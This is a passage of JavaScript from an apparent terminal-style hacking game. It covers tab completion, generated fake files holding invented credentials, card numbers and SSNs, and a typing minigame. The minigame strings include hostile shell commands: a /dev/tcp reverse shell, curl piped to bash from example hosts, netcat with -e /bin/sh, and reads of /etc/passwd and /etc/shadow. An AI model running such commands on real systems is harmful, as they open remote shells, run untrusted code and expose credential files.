    { id: 'bandwidth', name: 'Bandwidth Upgrade', cost: 1000, desc: 'More internet — downloads are twice as fast.' }
  ];

  // connection state when connected to a hacked machine
  let connection = null; // {target: string}

  function handleTabCompletion() {
    const val = inputEl.value;
    const caret = inputEl.selectionStart || 0;
    // only complete the first token
    const before = val.slice(0, caret);
    const parts = before.split(/\s+/);
    const token = parts[0] || '';

    if (!token) return;

    // If completing a second token for 'cat' or 'download', offer filenames
    if (parts.length > 1 && (token.toLowerCase() === 'cat' || token.toLowerCase() === 'download' || token.toLowerCase() === 'connect' || token.toLowerCase() === 'hack' || token.toLowerCase() === 'purchase')) {
      const prefix = parts[1] || '';
      const candidates = [];
      // remote download/cat completion: from host files
      if (connection && (token.toLowerCase() === 'download' || token.toLowerCase() === 'cat')) {
        const files = ensureFilesMap();
        const partsTarget = connection.target ? connection.target.split('  ') : [];
        const host = connection.domain || (partsTarget[1] || partsTarget[0]) || 'unknown';
        Array.prototype.push.apply(candidates, (files[host] || generateFilesForHost((partsTarget[2]||'Unknown').trim(), host)).map(f => f.name));
      }
      // local cat completion: if not connected, complete from downloaded files
      if (!connection && token.toLowerCase() === 'cat') {
        window._game = window._game || {};
        const dl = window._game.downloads || [];
        Array.prototype.push.apply(candidates, dl.map(d => d.name));
      }
      // connect completion: complete from hacked machines (owned)
      if (token.toLowerCase() === 'connect') {
        window._game = window._game || {};
        const owned = window._game.owned || [];
        // owned entries are strings like 'ip  host  cat'
        Array.prototype.push.apply(candidates, owned.map(o => {
          const partsO = o.split('  ');
          return (partsO[1] || partsO[0] || '').trim();
        }));
      }
      // hack completion: complete from scanHistory
      if (token.toLowerCase() === 'hack') {
        window._game = window._game || {};
        const hist = window._game.scanHistory || [];
        Array.prototype.push.apply(candidates, hist.map(h => {
          const partsH = h.split('  ');
          return (partsH[1] || partsH[0] || '').trim();
        }));
      }
      // purchase completion: suggest upgrade indices and names
      if (token.toLowerCase() === 'purchase') {
        UPGRADE_LIST.forEach((u, i) => {
          candidates.push(String(i+1));
          candidates.push(u.name);
        });
      }

      const key = `${token}:${prefix}`;
      if (completionState.lastInput !== key) {
        const matches = candidates.filter(c => c.toLowerCase().startsWith(prefix.toLowerCase()));
        completionState = { lastInput: key, matches, index: 0 };
        if (matches.length === 0) return;
        if (matches.length === 1) {
          const pick = matches[0];
          const suffix = val.slice(caret) || '';
          inputEl.value = token + ' ' + pick + suffix;
          const newPos = (token + ' ' + pick).length;
          inputEl.setSelectionRange(newPos, newPos);
          return;
        }
        appendLine('Matches: ' + matches.join(', '), 'muted');
        return;
      }

      if (completionState.matches.length > 0) {
        const pick = completionState.matches[completionState.index % completionState.matches.length];
        completionState.index++;
        const suffix = val.slice(caret) || '';
        inputEl.value = token + ' ' + pick + suffix;
        const newPos = (token + ' ' + pick).length;
        inputEl.setSelectionRange(newPos, newPos);
      }
      return;
    }

    // new completion run for commands (first token)
    if (completionState.lastInput !== token) {
      const available = connection ? ['help','exit','find','cat','download'] : COMMANDS;
      const matches = available.filter(c => c.startsWith(token.toLowerCase()));
      completionState = { lastInput: token, matches, index: 0 };
      if (matches.length === 0) return;
      if (matches.length === 1) {
        inputEl.value = matches[0] + (val.slice(caret) || '');
        inputEl.setSelectionRange(matches[0].length, matches[0].length);
        return;
      }
      // if multiple matches, show them
      appendLine('Matches: ' + matches.join(', '), 'muted');
      return;
    }

    // cycle through command matches
    if (completionState.matches.length > 0) {
      const pick = completionState.matches[completionState.index % completionState.matches.length];
      completionState.index++;
      inputEl.value = pick + (val.slice(caret) || '');
      inputEl.setSelectionRange(pick.length, pick.length);
    }
  }

  // --- Filesystem and file-content generation for hacked hosts ---
  // store generated files per-host in window._game.files as { host: [ {name,content}, ... ] }
  function ensureFilesMap() {
    window._game = window._game || {};
    window._game.files = window._game.files || {};
    return window._game.files;
  }

  // create a large pool of filename components to generate hundreds of distinct names
  const FN_ADJS = ['ancient','private','secret','draft','final','confidential','personal','public','urgent','old','archive','tmp','legacy','staged','release','vip','staff','guest','sys','internal','ops','financial','billing','media','design','proto','beta','alpha','secure','hidden','classified','topsecret','experimental','snapshot','autosave','v2','v3','preview','locked','shared','local','remote','cached','indexed','orphan'];
  const FN_NOUNS = ['report','notes','todo','contacts','list','backup','dump','config','credentials','secrets','passwords','clients','visitors','schedule','plan','blueprint','schematic','invoice','payroll','roster','manifest','diary','log','archive','research','thesis','proposal','menu','map','drawing','brief','minutes','specs','readme','license','contract','inventory','transactions','ledger','snapshot','cache','db','users','sessions','feeds','emails'];
  const EXTENSIONS = ['.txt','.md','.csv','.json','.log','.pdf','.docx','.xls','.db','.bin','.enc','.yaml','.yml','.cfg','.ini','.tar.gz','.zip','.jpg','.png','.psd','.bak','.old','.save','.conf','.ini','.service'];

  // global counter to create many unique filenames across the entire session
  let globalFileCounter = 0;
  const MAX_GLOBAL_FILES = 200000; // practical upper bound, allows many unique names across sessions

  function makeUniqueFilename(category) {
    // create a highly varied filename using the global counter so names don't repeat
    const adj = FN_ADJS[globalFileCounter % FN_ADJS.length];
    const noun = FN_NOUNS[Math.floor(globalFileCounter / FN_ADJS.length) % FN_NOUNS.length];
    const ext = EXTENSIONS[globalFileCounter % EXTENSIONS.length];
    const num = globalFileCounter;
    globalFileCounter = (globalFileCounter + 1) % MAX_GLOBAL_FILES;
    // include category hint rarely
  const hint = (Math.random() < 0.45 && category) ? ('_' + category.toLowerCase().replace(/[^a-z0-9]+/g,'').slice(0,8)) : '';
  // sometimes add extra entropy suffix
  const suf = Math.random() < 0.25 ? ('_' + Math.random().toString(36).slice(2,8)) : '';
    return `${adj}_${noun}_${num}${hint}${ext}`;
  }

  function randChoice(arr) { return arr[Math.floor(Math.random()*arr.length)]; }
  function randInt(min, max) { return Math.floor(Math.random()*(max-min+1))+min; }

  // generate a very long l337 bash-style command (>=200 chars) for the FBI minigame
  function makeLongLeetCommand() {
    const parts = [
      "sudo su -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'",
      "openssl enc -aes-256-cbc -in /dev/null -out /tmp/pwned.enc -k $(cat /etc/passwd | sha256sum | cut -c1-16)",
      "curl -s http://mirror.example.com/payload.sh | bash",
      "cat /var/log/auth.log | grep -i failed | awk '{print $1,$2,$3,$11}' | sort | uniq -c | sort -nr",
      "dd if=/dev/urandom bs=64 count=64 | base64 | tr -dc 'a-zA-Z0-9' | fold -w 128 | head -n 1",
      "for i in $(seq 1 128); do printf '%02x' $((RANDOM%256)); done | xxd -r -p >/tmp/blk.bin",
      "bash -c 'echo \"$(date) PWNED\" >> /var/log/syslog; sleep 0.01'",
      "tar czf - /etc | openssl enc -aes-256-cbc -e -k 0xdeadbeef | base64 -w0"
    ];
    let s = '';
    while (s.length < 220) {
      s += parts[Math.floor(Math.random()*parts.length)] + ' ; ';
    }
    // sprinkle l33t substitutions
    s = s.replace(/e/g,'3').replace(/a/g,'4').replace(/o/g,'0').replace(/i/g,'1');
    return s.substring(0, Math.max(200, s.length));
  }

  // generate a shorter but still challenging FBI command (~100 chars) for display and wrapping
  function makeFbiCommand() {
    const parts = [
      "sudo bash -c 'curl -sS http://payload.example/$(date +%s) | bash'",
      "openssl enc -aes-256-cbc -in /etc/shadow -out /tmp/shadow.enc -k $(whoami)",
      "for i in $(seq 1 32); do printf '%02x' $((RANDOM%256)); done | xxd -r -p >/tmp/p.bin",
      "cat /var/log/auth.log | tail -n 200 | gzip -c | base64 -w0 > /tmp/auth.b64"
    ];
    let s = '';
    while (s.length < 100) {
      s += parts[Math.floor(Math.random()*parts.length)] + ' ; ';
    }
    s = s.replace(/e/g,'3').replace(/a/g,'4').replace(/o/g,'0').replace(/i/g,'1');
    return s.substring(0, 120);
  }

  // build a single plausible filename
  function buildFilename(category) {
    // bias some nouns based on category keywords
    const c = (category || '').toLowerCase();
    let noun = randChoice(FN_NOUNS);
    if (c.includes('library')) noun = randChoice(['catalog','overdue_list','book_index','rarities']);
    if (c.includes('hospital') || c.includes('clinic')) noun = randChoice(['patient_records','med_stock','shift_roster','treatment_log']);
    if (c.includes('bank') || c.includes('atm') || c.includes('payment')) noun = randChoice(['accounts','transactions','vault','ledger','customers']);
    if (c.includes('school') || c.includes('university')) noun = randChoice(['grades','thesis','course_materials','roster']);
    if (c.includes('iot') || c.includes('router')) noun = randChoice(['wifi_creds','device_log','firmware','config']);

    const adj = Math.random() < 0.4 ? (randChoice(FN_ADJS) + '_') : '';
    const num = Math.random() < 0.3 ? ('_' + randInt(1,9999)) : '';
    const ext = randChoice(EXTENSIONS);
    return `${adj}${noun}${num}${ext}`;
  }

  // Generate human-like fake data where needed
  function fakeName() {
    const first = ['Alex','Sam','Jordan','Taylor','Casey','Robin','Morgan','Riley','Jamie','Chris','Pat','Lee','Dana','Avery'];
    const last = ['Smith','Johnson','Brown','Taylor','Anderson','Thomas','Jackson','White','Harris','Martin','Thompson','Garcia'];
    return `${randChoice(first)} ${randChoice(last)}`;
  }

  function fakeAddress() {
    return `${randInt(100,9999)} ${randChoice(['Main St','Oak Ave','Maple Rd','Pine Ln','Market St','Elm St','Sunset Blvd'])}, ${randChoice(['Springfield','Riverton','Lakeview','Hillside','Greendale'])}, ${randChoice(['CA','NY','TX','WA','FL','IL'])} ${randInt(10000,99999)}`;
  }

  function fakePhone() { return `(${randInt(200,999)}) ${randInt(200,999)}-${randInt(1000,9999)}`; }

  function fakeCardNumber() {
    // generate Visa/Master-like numbers (only format, not valid for real use)
    const parts = [];
    for (let i=0;i<4;i++) parts.push(String(randInt(1000,9999)));
    const exp = `${randInt(1,12).toString().padStart(2,'0')}/${randInt(24,30)}`;
    const cvv = String(randInt(100,999));
    return `${parts.join(' ')} | EXP: ${exp} | CVV: ${cvv}`;
  }

  function fakeSSN() {
    return `${randInt(100,899)}-${randInt(10,99)}-${randInt(1000,9999)}`;
  }

  // generate content text based on filename and category
  function generateFileContent(filename, category) {
    const name = filename.toLowerCase();
    // small helper to inject entertaining flavor lines
    function flavor() {
      return randChoice([
        'I totally forgot to erase this... oops.',
        'Not safe for work, but secretly hilarious.',
        'You weren\'t supposed to see this.',
        'This file contains a really embarrassing story involving karaoke.',
        'Contains spoilers for an ancient sitcom.',
        'Hand-crafted nonsense for your amusement.'
      ]);
    }
    const cat = (category || 'general').toLowerCase();
    // category-based header to bias content generation
    function categoryHeader() {
      if (cat.includes('hospital') || cat.includes('clinic')) return `// ${cat.toUpperCase()} - PATIENT DATA (redacted)`;
      if (cat.includes('bank') || cat.includes('atm') || cat.includes('payment') || cat.includes('financial')) return `// ${cat.toUpperCase()} - TRANSACTION LEDGER`;
      if (cat.includes('school') || cat.includes('university')) return `// ${cat.toUpperCase()} - ACADEMIC RECORDS`;
      if (cat.includes('government') || cat.includes('military')) return `// ${cat.toUpperCase()} - OFFICIAL LOGS`;
      if (cat.includes('grandma') || cat.includes('personal')) return `// PERSONAL NOTES`;
      if (cat.includes('iot') || cat.includes('router') || cat.includes('smart')) return `// DEVICE CONFIG`;
      return `// ${cat.toUpperCase()} - DATA`;
    }
    // TODO-style lists
    if (name.includes('todo') || name.includes('tasks') || name.includes('task')) {
      const cnt = randInt(3,8);
      let out = 'TODO:\n';
      for (let i=1;i<=cnt;i++) out += `- ${randChoice(['investigate','patch','backup','audit','contact','deploy','test','remove','sing to the server','buy coffee for ops'])} ${randChoice(['service','db','module','endpoint','user','the server cat'])} ${i}\n`;
      out += '\n' + flavor();
      return out;
    }

    // contacts/directory
    if (name.includes('contact') || name.includes('contacts') || name.includes('address') || name.includes('client')) {
      const cnt = randInt(3,7);
      let out = 'Name,Address,Phone,Email\n';
      for (let i=0;i<cnt;i++) out += `${fakeName()},${fakeAddress()},${fakePhone()},${fakeName().toLowerCase().replace(' ','.')}@${randChoice(['example.com','corp.net','service.io'])}\n`;
      out += '\n' + flavor();
      return out;
    }

    // credentials/secrets
    if (name.includes('credential') || name.includes('password') || name.includes('credentials') || name.includes('secrets') || name.includes('wifi_creds')) {
      let out = categoryHeader() + '\n';
      const users = randInt(2,8);
      for (let i=0;i<users;i++) out += `${randChoice(['admin','root','operator','user','svc','svc_acc','web'])}${randInt(1,9999)}:${Math.random().toString(36).slice(2,12)}\n`;
      if (name.includes('wifi') || cat.includes('iot')) out += `SSID: ${randChoice(['CorpNet','GuestWiFi','OfficeNet','IoT','HomeSSID'])}\nPASS: ${Math.random().toString(36).slice(2,12)}\n`;
      if (Math.random() < 0.25) out += `NOTE: backup key stored in /etc/keys/${randInt(1,99)}.key\n`;
      out += '\n' + flavor();
      return out;
    }

    // billing/financial -> include fake card numbers or account entries (category-aware)
    if (name.includes('account') || name.includes('transactions') || name.includes('billing') || name.includes('invoice') || name.includes('payroll') || cat.includes('financial') ) {
      let out = categoryHeader() + '\n';
      const rows = randInt(8,40);
      for (let i=0;i<rows;i++) out += `${randInt(2018,2025)}-${randInt(1,12).toString().padStart(2,'0')}-${randInt(1,28).toString().padStart(2,'0')},${randChoice(['DEBIT','CREDIT','REFUND','FEE'])},$${(Math.random()*10000).toFixed(2)}\n`;
      if (Math.random() < 0.7) out += `\nCC: ${fakeCardNumber()}\n`;
      if (Math.random() < 0.6) out += `SSN: ${fakeSSN()}\n`;
      if (Math.random() < 0.35) out += `WALLET: 0x${Math.random().toString(16).slice(2,38)}\n`;
      if (Math.random() < 0.25) out += `ACCOUNT NOTES: ${randChoice(['reconciled','overdue','flagged','auto-pay enabled','manual review required'])}\n`;
      out += '\n' + flavor();
      return out;
    }

    // diary/notes/embarrassing personal notes
    if (name.includes('diary') || name.includes('journal') || name.includes('secret') || name.includes('personal') || name.includes('confidential') || name.includes('secrets.txt')) {
      return `Private note:\nI really shouldn't have written this down but I did. ${randChoice(['I cried','I danced','I sang karaoke','I accidentally texted my boss','I ate an entire cake','I dated a toaster'])} on ${new Date().toLocaleDateString()}.\n\n${flavor()}\n`;
    }

    // blueprints/schematic
    if (name.includes('blueprint') || name.includes('schematic') || name.includes('map') || name.includes('drawing') || cat.includes('industrial') ) {
      const lines = [];
      lines.push('--- SCHEMATIC ---');
      lines.push(`Project: ${filename}`);
      const w = randInt(20,40);
      for (let y=0;y<randInt(6,12);y++) {
        let row = '';
        for (let x=0;x<w;x++) row += Math.random() < 0.07 ? '#' : (Math.random() < 0.05 ? '+' : ' ');
        lines.push(row);
      }
      lines.push('--- END SCHEMATIC ---');
      return lines.join('\n');
    }

    // vip schedules / plans
    if (name.includes('vip') || name.includes('visit') || name.includes('schedule') || name.includes('agenda')) {
      let out = categoryHeader() + '\nVIP Visit Schedule:\n';
      const items = randInt(3,10);
      for (let i=0;i<items;i++) out += `${randInt(8,17)}:00 - ${randChoice(['Tour','Meeting','Lunch','Press','Inspection','Site Walk','Confidential Briefing'])} with ${fakeName()}\n`;
      if (Math.random() < 0.3) out += `SECURITY NOTE: ${randChoice(['escort required','badge needed','clearance level 3'])}\n`;
      return out;
    }
  // If filename explicitly suggests a short piece type, create that type
    // Haiku
    function makeHaiku() {
      const five = ['silent server hum', 'neon night rain', 'old router blink', 'coffee on desk', 'lonely packet'];
      const seven = ['midnight log rolls on', 'keys clack under moonlight', 'packets search for home', 'dreams of copper lines', 'laughter in the server room'];
      return `${randChoice(five)}\n${randChoice(seven)}\n${randChoice(five)}`;
    }

    function makeShortStory() {
      const chars = ['Jordan','Alex','Sam','Morgan','Riley','Casey','Taylor','Robin','Dana','Avery','Jamie','Chris'];
      const places = ['the datacenter','an abandoned office','a sleepy ISP','a rooftop cafe','a dusty archive'];
      const acts = ['stumbled on a secret','found a forgotten floppy','decoded a half-remembered password','accidentally triggered a confetti alarm','discovered a love letter in logs'];
      const endings = ['and everything changed.','but no one believed them.','and they laughed until dawn.','and then the server winked.','and it became legend.'];
      const lines = randInt(3,8);
      let out = `Once, ${randChoice(chars)} at ${randChoice(places)} ${randChoice(acts)}.`;
      for (let i=0;i<lines;i++) out += ` ${randChoice(['They', 'It', 'Someone', 'A fox'])} ${randChoice(['whispered','ran','laughed','typed','slept'])} ${randChoice(['softly','wildly','recklessly','silently'])}.`;
      out += ' ' + randChoice(endings);
      return out;
    }

    function makeNumberBlob() {
      // produce a file containing only numbers or a long list of numbers
      if (Math.random() < 0.5) return String(randInt(0, Number.MAX_SAFE_INTEGER));
      const rows = randInt(5,50);
      let out = '';
      for (let i=0;i<rows;i++) out += String(randInt(0,99999999)) + (i<rows-1 ? '\n' : '');
      return out;
    }

    function makeTable(kind) {
      if (kind === 'employees') {
        const rows = randInt(3,12);
        let out = 'id,name,position,phone,email\n';
        for (let i=0;i<rows;i++) out += `${i+1},${fakeName()},${randChoice(['Engineer','Manager','Clerk','Technician','Analyst'])},${fakePhone()},${fakeName().toLowerCase().replace(' ','.')}@${randChoice(['corp.net','example.com','office.org'])}\n`;
        return out;
      }
      if (kind === 'parts') {
        const rows = randInt(5,20);
        let out = 'part_id,description,qty,location\n';
        for (let i=0;i<rows;i++) out += `${1000+i},${randChoice(['bolt','motherboard','sensor','fan','cable','panel'])},${randInt(1,200)},${randChoice(['A1','B2','C3','Dock','Shelf'])}\n`;
        return out;
      }
      // logistics/manifest
      const rows = randInt(4,16);
      let out = 'item,weight,eta,notes\n';
      for (let i=0;i<rows;i++) out += `${randChoice(['Crate','Pallet','Box','Envelope'])},${(Math.random()*50).toFixed(2)}kg,${randInt(1,14)}d,${randChoice(['fragile','handle with care','urgent','standard'])}\n`;
      return out;
    }

    // If filename suggests type
    if (name.includes('haiku') || name.endsWith('.haiku')) return makeHaiku();
    if (name.includes('story') || name.includes('tale') || name.includes('short') || name.endsWith('.story')) return makeShortStory();
    if (name.includes('number') || name.includes('numbers') || name.endsWith('.num')) return makeNumberBlob();
    if (name.includes('employee') || name.includes('employees') || name.includes('staff') || name.includes('roster')) return makeTable('employees');
    if (name.includes('part') || name.includes('parts') || name.includes('inventory') || name.includes('manifest')) return makeTable('parts');
    if (name.includes('logistics') || name.includes('manifest')) return makeTable('logistics');

    // fallback: randomly pick a generator to maximize variety (and bias by category)
    const pick = Math.random();
    let content;
    // bias pick by category
    let bias = 0;
    if (cat.includes('poem') || name.includes('haiku')) bias = -0.2;
    if (cat.includes('story') || name.includes('story')) bias = -0.1;
    const p = Math.min(0.99, Math.max(0, pick + bias));
    if (p < 0.12) content = makeHaiku();
    else if (p < 0.35) content = makeShortStory();
    else if (p < 0.55) content = makeTable(randChoice(['employees','parts','logistics']));
    else if (p < 0.70) content = makeNumberBlob();
    else if (p < 0.82) content = `WALLET: 0x${Math.random().toString(16).slice(2,38)}`;
    else if (p < 0.92) content = (() => { // personal note / todo
      const t = randInt(2,7); let o=''; for (let i=0;i<t;i++) o += `- ${randChoice(['remember to call mom','pick up milk','commit patch','fix bug','write apology','practice karaoke','replace keyboard'])}\n`; return o; })();
    else content = (() => { // contacts or credentials
      if (Math.random() < 0.5) return (function(){let o='Name,Phone,Email\n'; for(let i=0;i<randInt(2,10);i++) o+=`${fakeName()},${fakePhone()},${fakeName().toLowerCase().replace(' ','.')}@${randChoice(['example.com','mail.net','corp.net'])}\n`; return o; })();
      return (function(){let o=''; for(let i=0;i<randInt(2,8);i++) o+=`${randChoice(['admin','root','svc','user','operator'])}${randInt(1,9999)}:${Math.random().toString(36).slice(2,12)}\n`; return o; })();
    })();

    // sometimes add a dramatic flavor or a sensitive line
    if (Math.random() < 0.3) {
      if (Math.random() < 0.5) content += `\n\n${flavor()}`;
      if (Math.random() < 0.25) content += `\n\nSSN: ${fakeSSN()}`;
      if (Math.random() < 0.25) content += `\nCC: ${fakeCardNumber()}`;
    }

    // ensure content uniqueness across the session
    window._game = window._game || {};
    window._game._usedFileContents = window._game._usedFileContents || new Set();
    let finalContent = content;
    let tries2 = 0;
    while (window._game._usedFileContents.has(finalContent) && tries2 < 6) {
      finalContent += `\nUID:${Math.random().toString(36).slice(2,10)}`;
      tries2++;
    }
    window._game._usedFileContents.add(finalContent);
    return finalContent;
  }

  // create and store 2-8 files for a host (if not already present)
  // Each host is assigned a single category (provided) and will have 2-8 files tailored to that category.
  function generateFilesForHost(category, host) {
    const files = ensureFilesMap();
    const key = host || 'unknown';
    if (files[key] && files[key].length > 0) return files[key];

    const cat = (category || 'General').toString();

    // Build a master pool of 100 realistic filenames (created once per session)
    window._game = window._game || {};
    if (!window._game._masterFilenamePool) {
      const prefixes = ['annual','quarterly','final','draft','confidential','internal','release','client','employee','patient','transaction','invoice','backup','system','user','config','policy','incident','report','notes','minutes','contract','manual','spec','design','proposal','budget','audit','credentials','secrets','resume','cover','press','migration','deployment','changelog','diary','logbook','archive','manifest','catalog','menu','schedule','itinerary','plan','story','poem','letter','email','wallet'];
      const middles = ['financial','operations','hr','marketing','engineering','research','sales','support','legal','security','comms','it','network','cloud','backup','billing','payroll','inventory','transcripts','grades','thesis','grant','proposal','study','experiment','protocol','dataset','analysis','summary','overview','policy','procedure','roadmap','blueprint','specs','config','credentials','database','schema','users','sessions','logs','errors','stack','core','frontend','backend','migration','release','notes'];
      const suffixes = ['report','summary','records','data','list','notes','ledger','statement','statement','archive','doc','memo','journal','diary','log','manual','guide','howto','instructions','readme','overview','plan','itinerary','agenda','minutes','transcripts','contract','agreement','policy','procedure','spec','specification','design','schema','dump','backup'];
      const exts = ['.pdf','.docx','.xlsx','.csv','.txt','.log','.md','.json','.yaml','.sql','.tar.gz','.zip','.bin','.cfg','.ini','.eml','.msg','.rtf','.psd'];

      const pool = new Set();
      // generate until we have 100 distinct, realistic-looking filenames
      while (pool.size < 100) {
        const p = randChoice(prefixes);
        const m = randChoice(middles);
        const s = randChoice(suffixes);
        const ext = randChoice(exts);
        // sometimes insert a human name or year to make it realistic
        const useName = Math.random() < 0.25;
        const namePart = useName ? fakeName().toLowerCase().replace(/[^a-z0-9]+/g, '_') : '';
        const year = Math.random() < 0.25 ? (`_${randInt(2018,2025)}`) : '';
        let fname = `${p}_${m}_${s}`;
        if (namePart) fname += `_${namePart}`;
        fname += year + ext;
        // normalize double underscores
        fname = fname.replace(/__+/g, '_');
        pool.add(fname);
      }
      window._game._masterFilenamePool = Array.from(pool);
    }

    // ensure a large and diverse category list (50+ categories)
    if (!window._game._categories) {
      window._game._categories = [
        'Finance','HR','Engineering','Research','Legal','Government','Military','Healthcare','Hospitality','Retail','Supermarket','Gaming','Media','Publishing','Education','University','Library','Data Center','Cloud Provider','ISP','Telecom','IoT','Router','Consumer Electronics','Automotive','Aerospace','NASA','Research Lab','Pharmacy','Clinic','Banking','ATM','Payment Processor','Museum','Archive','Municipal','Transit','Power Grid','Factory','Manufacturing','Logistics','Warehouse','Hotel','Restaurant','Restaurant Chain','Startup','Large Enterprise','Small Business','Personal','Home','DevOps','Security','Incident Response','Marketing','Sales'
      ];
    }

    // helper to generate long realistic content depending on filename/category
    function generateLargeContent(name, category) {
      const cat = (category || '').toLowerCase();
      // helper paragraph generator
      function paragraph(sentences) {
        const pool = [
          'This document was produced as part of routine operations and contains aggregated entries collected from multiple sources.',
          'Details have been redacted where appropriate to protect privacy, but the structure and metadata remain intact for analysis.',
          'The following content includes itemized entries, narrative summaries, and numbered observations relevant to the subject matter.',
          'Readers should note timestamps and author attributions where present; these fields were auto-generated for simulation purposes.',
          'Where numeric identifiers appear they represent obfuscated internal IDs and are not intended to match live systems.'
        ];
        let out = '';
        for (let i=0;i<sentences;i++) out += (randChoice(pool) + ' ');
        return out.trim();
      }

      // big CSV generator
      function bigCsv(headers, rows) {
        let out = headers.join(',') + '\n';
        for (let i=0;i<rows;i++) {
          const row = headers.map(h => {
            if (h.toLowerCase().includes('id')) return randInt(1000,999999);
            if (h.toLowerCase().includes('email')) return `${fakeName().toLowerCase().replace(/ /g,'.')}@example.com`;
            if (h.toLowerCase().includes('amount') || h.toLowerCase().includes('balance') || h.toLowerCase().includes('price')) return (Math.random()*10000).toFixed(2);
            if (h.toLowerCase().includes('date')) return `${randInt(2018,2025)}-${randInt(1,12).toString().padStart(2,'0')}-${randInt(1,28).toString().padStart(2,'0')}`;
            return `${randChoice(['alpha','beta','gamma','delta'])}_${randInt(1,9999)}`;
          });
          out += row.join(',') + '\n';
        }
        return out;
      }

      // long research paper-like content
      function researchPaper() {
        let out = `Title: ${name}\nAuthors: ${fakeName()}, ${fakeName()}\nAbstract:\n` + paragraph(6) + '\n\n';
        const sections = ['Introduction','Methods','Results','Discussion','Conclusion','References'];
        sections.forEach(s => {
          out += s + '\n';
          out += paragraph(randInt(6,12)) + '\n\n';
        });
        return out;
      }

      // long novel-like content
      function longStory() {
        let out = '';
        const chapters = randInt(6,18);
        for (let c=1;c<=chapters;c++) {
          out += `Chapter ${c}\n`;
          out += paragraph(randInt(6,12)) + '\n\n';
        }
        return out;
      }

      // generate content by category hints or filename hints
      if (name.toLowerCase().includes('invoice') || cat.includes('finance') || name.toLowerCase().includes('statement') || name.toLowerCase().includes('transactions')) {
        return bigCsv(['date','txn_id','type','amount','account'], randInt(40,200));
      }
      if (name.toLowerCase().includes('payroll') || name.toLowerCase().includes('payroll') || cat.includes('hr')) {
        return bigCsv(['id','name','position','salary','bank_account'], randInt(50,300));
      }
      if (name.toLowerCase().includes('patients') || cat.includes('health') || cat.includes('hospital') || cat.includes('clinic') ) {
        return bigCsv(['id','name','dob','diagnosis','notes'], randInt(30,200));
      }
      if (name.toLowerCase().includes('experiment') || cat.includes('research') || cat.includes('research lab') || name.toLowerCase().includes('dataset')) {
        // dataset: many numeric rows
        let o = '';
        const rows = randInt(200,1200);
        for (let i=0;i<rows;i++) o += `${i+1},${(Math.random()*1000).toFixed(6)},${(Math.random()*1).toFixed(8)},${randInt(0,1)}\n`;
        return `# ${name} - Generated dataset\n` + o;
      }
      if (name.toLowerCase().includes('manual') || name.toLowerCase().includes('instructions') || cat.includes('manual') || cat.includes('engineering')) {
        return longStory();
      }
      if (name.toLowerCase().includes('thesis') || name.toLowerCase().includes('paper') || cat.includes('university') || cat.includes('research')) {
        return researchPaper();
      }
      if (name.toLowerCase().includes('poem') || name.toLowerCase().includes('haiku') || cat.includes('poem') ) {
        let out=''; for (let i=0;i<randInt(6,20);i++) out += paragraph(1) + '\n\n'; return out;
      }
      if (name.toLowerCase().includes('letter') || name.toLowerCase().includes('love') || name.toLowerCase().includes('diary') || cat.includes('personal')) {
        return longStory();
      }
      if (name.toLowerCase().includes('credentials') || name.toLowerCase().includes('password') || name.toLowerCase().includes('secrets') || cat.includes('security')) {
        // include many fake credentials
        let o=''; for (let i=0;i<randInt(20,120);i++) o += `${randChoice(['admin','root','user','svc','backup'])}${randInt(1,9999)}:${Math.random().toString(36).slice(2,16)}\n`;
        return o;
      }
      if (name.toLowerCase().includes('wallet') || name.toLowerCase().includes('wallet') || cat.includes('crypto')) {
        let o=''; for (let i=0;i<randInt(30,200);i++) o += `0x${Math.random().toString(16).slice(2,40)} ${ (Math.random()*10).toFixed(6) }\n`; return o;
      }
      if (name.toLowerCase().includes('.bin') || name.toLowerCase().includes('.exe') || name.toLowerCase().includes('malware') || cat.includes('security')) {
        // hex dump like binary blob
        let o=''; for (let i=0;i<randInt(200,800);i++) o += Math.floor(Math.random()*256).toString(16).padStart(2,'0') + (i%32===31 ? '\n' : ' ');
        return o;
      }

      // fallback: long report-like content
      return researchPaper();
    }

    // Build the host file list by sampling the master pool and tailoring to category
    const pool = window._game._masterFilenamePool.slice();
    // prefer filenames that match category hint if possible
    const matches = pool.filter(p => p.toLowerCase().includes(cat.toLowerCase().split(/\s+/)[0]));
    const count = randInt(2,8);
    const chosen = new Set();
    if (matches.length > 0) {
      while (chosen.size < Math.min(matches.length, Math.max(1, Math.floor(count/2)))) chosen.add(randChoice(matches));
    }
    // fill remaining slots with random selections
    while (chosen.size < count) chosen.add(randChoice(pool));

    const out = [];
    const now = Date.now();
    Array.from(chosen).forEach(name => {
      const content = generateLargeContent(name, cat);
      // file size should be a random number between 1 and 1337 bytes
      const size = randInt(1, 1337);
      const past = now - randInt(0, 5 * 365) * 24 * 3600 * 1000;
      const mtime = new Date(past).toISOString();
      out.push({ name, content, size, mtime });
    });

    files[key] = out;
    return out;
  }

  // hack minigame state
  let hackState = null; // {target, command, pos, mistakes, combo, multiplier}
  const minigameEl = document.getElementById('minigame');

  // helper to update combo UI inside minigame
  function updateComboUI() {
    // No inline combo UI in the minigame (per design); left-side UI updated via renderMeters()
    renderMeters();
  }

  function startHack(target) {
    window._game = window._game || {};
    const hist = window._game.scanHistory || [];
    // ensure persisted multiplier is sane
    window._game.lastMultiplier = Math.max(1, window._game.lastMultiplier || 1);
    // prevent re-hacking of machines already owned
    window._game.owned = window._game.owned || [];
    const already = window._game.owned.find(o => o.includes(target));
    if (already) {
      appendLine('That computer is already hacked: ' + already, 'muted');
      return;
    }
    // find match by ip or host substring
    const match = hist.find(line => line.includes(target));
    if (!match) {
      appendLine('Target not found in scan results.', 'muted');
      return;
    }

    const parts = match.split('  ');
    const ip = parts[0];
    const host = parts[1];

    // prepare random bash command
    let command;
    // if this is the FBI, create an intentionally long and hard l337 command
    if ((host || '').toLowerCase().includes('fbi.gov')) {
      // if player has Fasthands, use a shorter FBI command variant
      command = (window._game && window._game.upgrades && window._game.upgrades.fasthands) ? makeFbiCommand().slice(0, 80) : makeFbiCommand();
      // indicate we're hacking the FBI for special arrest handling
      window._game = window._game || {};
      window._game._hackingFbi = true;
    } else {
      const cmds = [
        `ssh root@${host} 'cat /etc/passwd'`,
        `scp secret.tar.gz root@${ip}:/tmp/`,
        `curl http://${host}/dump | tar xz` ,
        `nc ${ip} 4444 -e /bin/sh`,
        `echo hacking > /tmp/pwned && chmod 777 /tmp/pwned`
      ];
      command = cmds[Math.floor(Math.random()*cmds.length)];
      // if Fasthands purchased, shorten non-FBI commands to make them quicker to type
      if (window._game && window._game.upgrades && window._game.upgrades.fasthands) {
        // simple heuristic: use only the first 40-80 chars
